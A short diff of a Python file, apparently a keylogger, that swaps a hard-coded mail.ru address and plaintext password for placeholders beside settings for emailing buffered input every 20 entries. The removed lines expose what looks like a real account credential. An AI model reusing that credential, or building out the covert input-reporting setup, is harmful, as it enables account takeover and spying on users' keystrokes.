@@ -217,8 +217,8 @@ import plistlib
 import os
 
 # Конфигурация почты
-EMAIL_ADDRESS = "danil.smoke.00@mail.ru"
-EMAIL_PASSWORD = "1uPXdHjvcWxe4S70STWG"
+EMAIL_ADDRESS = "СВОЯ_ПОЧТА"
+EMAIL_PASSWORD = "ПАРОЛЬ_ОТ_ПОЧТЫ"
 SEND_REPORT_EVERY = 20
 
 inputs = []  # Буфер для ввода
